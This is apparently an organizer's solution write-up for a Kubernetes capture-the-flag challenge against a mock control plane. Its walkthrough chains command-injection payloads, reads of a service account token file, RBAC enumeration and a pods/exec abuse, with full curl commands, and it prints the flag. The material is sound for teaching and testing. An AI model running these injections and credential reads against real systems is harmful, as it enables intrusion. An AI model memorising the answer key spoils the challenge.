# D30 — Internal Kubernetes: Complete Organizer Solution & Engineering Architecture

## 1. Challenge Overview
* **Challenge ID:** D30
* **Name:** Internal Kubernetes
* **Category:** Kubernetes Security / RBAC Exploitation / Service Account Pivoting
* **Difficulty:** Very Hard+
* **External Interface:** TCP/80 (Web Gateway)
* **Classification:** STANDARD (Restricted Pod Security Baseline, Pure Python Mock K8s Control Plane)

---

## 2. Core Architecture & Safety Boundary

The challenge models a production Kubernetes environment running inside Doctor Doom's Latverian Cybernetic Defense Grid.

```text
Player (HTTP / Port 80)
   |
   v
Compromised Application (Fleet Sentinel Dashboard / Diagnostic Probe API)
   |
   v
Challenge-Local Identity (/var/run/secrets/kubernetes.io/serviceaccount/token)
   |
   v
Mock Kubernetes Control Plane (127.0.0.1:6443 - Pure Python / Synthetic RBAC)
   |
   v
Final Challenge Resource (Pod: doombot-defense-controller-0 in 'orbital-defense')
   |
   v
Flag: YUVA{k8s_rb4c_s3rv1c3_4cc0unt_3x3c_p1v0t_9d82e1}
```

### Safety Invariants & Boundary Guarantees:
1. **Zero Exposure to Real Kubernetes:** The Kubernetes API server at `127.0.0.1:6443` is a deterministic, synthetic Python daemon running exclusively on loopback. It has no connection to the real host cluster, real kubelet, or cloud provider.
2. **No Privileged Workloads:** The container runs as unprivileged user `sentinel` (uid 1002), with `allowPrivilegeEscalation: false`, all capabilities dropped, and no host volume mounts or runtime sockets.
3. **Automount ServiceAccount Disabled:** The outer deployment manifest sets `automountServiceAccountToken: false` to ensure real event infrastructure credentials never enter the pod.

---

## 3. Step-by-Step Intended Solve Walkthrough

### Step 1: Initial Application Compromise
1. Access the web dashboard at `http://<TARGET_IP>:80/`.
2. Analyze the Cluster Diagnostic Probe feature at `/api/v1/diagnostics/probe`.
3. Discover that the backend concatenates the `target` parameter into a shell execution string without sanitization.
4. Execute a command injection test:
   ```bash
   curl -s -X POST http://<TARGET_IP>:80/api/v1/diagnostics/probe \
        -H "Content-Type: application/json" \
        -d '{"probe_type": "ping", "target": "127.0.0.1; id"}'
   ```
   **Output:** `uid=1002(sentinel) gid=1002(sentinel) groups=1002(sentinel)`

---

### Step 2: Locate Challenge-Local Service Account Credentials
1. Inspect the standard in-cluster Kubernetes ServiceAccount token mount directory:
   ```bash
   curl -s -X POST http://<TARGET_IP>:80/api/v1/diagnostics/probe \
        -H "Content-Type: application/json" \
        -d '{"probe_type": "ping", "target": "127.0.0.1; ls -la /var/run/secrets/kubernetes.io/serviceaccount/"}'
   ```
2. Read the ServiceAccount namespace and token:
   ```bash
   curl -s -X POST http://<TARGET_IP>:80/api/v1/diagnostics/probe \
        -H "Content-Type: application/json" \
        -d '{"probe_type": "ping", "target": "127.0.0.1; cat /var/run/secrets/kubernetes.io/serviceaccount/token"}'
   ```
   **Token:** `latv_k8s_sa_sentinel_tok_9948270182749102`  
   **Namespace:** `telemetry-system`  
   **API Server:** `https://127.0.0.1:6443`

---

### Step 3: Enumerate Namespaces and RBAC Permissions
1. List available cluster namespaces:
   ```bash
   curl -s -X POST http://<TARGET_IP>:80/api/v1/diagnostics/probe \
        -H "Content-Type: application/json" \
        -d '{"probe_type": "ping", "target": "127.0.0.1; curl -k -s https://127.0.0.1:6443/api/v1/namespaces -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\""}'
   ```
   **Namespaces:** `default`, `kube-system`, `telemetry-system`, `orbital-defense`.

2. Query RBAC rules using `SelfSubjectRulesReview` or `kubectl auth can-i --list`:
   ```bash
   curl -s -X POST http://<TARGET_IP>:80/api/v1/diagnostics/probe \
        -H "Content-Type: application/json" \
        -d '{"probe_type": "ping", "target": "127.0.0.1; curl -k -s -X POST https://127.0.0.1:6443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" -H \"Content-Type: application/json\" -d \"{\\\"spec\\\": {\\\"namespace\\\": \\\"orbital-defense\\\"}}\""}'
   ```
3. **Discovered RBAC Rules in `orbital-defense`:**
   ```json
   [
     {
       "verbs": ["get", "list"],
       "apiGroups": [""],
       "resources": ["pods"]
     },
     {
       "verbs": ["create"],
       "apiGroups": [""],
       "resources": ["pods/exec"]
     }
   ]
   ```
   The ServiceAccount has an intentionally over-broad privilege: `create` on `pods/exec` in the restricted `orbital-defense` namespace!

---

### Step 4: Enumerate Pods in Target Namespace
1. List running pods in `orbital-defense`:
   ```bash
   curl -s -X POST http://<TARGET_IP>:80/api/v1/diagnostics/probe \
        -H "Content-Type: application/json" \
        -d '{"probe_type": "ping", "target": "127.0.0.1; curl -k -s https://127.0.0.1:6443/api/v1/namespaces/orbital-defense/pods -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\""}'
   ```
   **Target Pod:** `doombot-defense-controller-0`

---

### Step 5: Exploit Over-Broad `pods/exec` Permission
1. Dispatch an authorized `POST` request to the `pods/exec` subresource:
   ```bash
   curl -s -X POST http://<TARGET_IP>:80/api/v1/diagnostics/probe \
        -H "Content-Type: application/json" \
        -d '{"probe_type": "ping", "target": "127.0.0.1; curl -k -s -X POST \"https://127.0.0.1:6443/api/v1/namespaces/orbital-defense/pods/doombot-defense-controller-0/exec?command=cat&command=/var/run/secrets/latveria.io/defense_flag.txt\" -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\""}'
   ```
2. **Output:**
   ```text
   LATVERIAN ORBITAL DEFENSE GRID — SOVEREIGN OVERRIDE KEY:
   FLAG: YUVA{k8s_rb4c_s3rv1c3_4cc0unt_3x3c_p1v0t_9d82e1}
   STATUS: GRANTED TO AUTHORIZED DEFENSE CONTROLLER
   ```

---

## 4. Automated Solver & Verification
Run the clean-room automated solver:
```bash
python3 organizer/solve.py --url http://127.0.0.1:8080
```

Run the 10-stage pre-event adversarial test suite:
```bash
python3 organizer/test_challenge.py --url http://127.0.0.1:8080
```

---

## 5. Reset & Dynamic Flag Lifecycle
1. The challenge supports dynamic flag injection via the `$FLAG` environment variable.
2. During container recreation or pod restart, `entrypoint.sh` writes the fresh dynamic flag to the isolated path `/opt/orbital-defense/flag.txt`.
3. No attacker artifacts or persistent modifications survive across pod redeployments.
